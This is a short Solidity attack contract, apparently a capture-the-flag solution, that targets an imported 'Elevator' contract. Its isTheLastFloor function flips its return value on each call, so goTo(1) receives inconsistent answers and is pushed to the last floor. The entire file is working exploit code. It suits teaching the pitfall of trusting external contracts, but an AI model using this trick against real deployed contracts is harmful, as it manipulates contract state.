// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Vulnerable.sol";
contract ElevatorAttack {
    bool private called;

    function isTheLastFloor (uint) external returns (bool) {
        called = !called;
        return called;
    }
    function attack (address target) external {
        Elevator(target).goTo(1);
    }
}
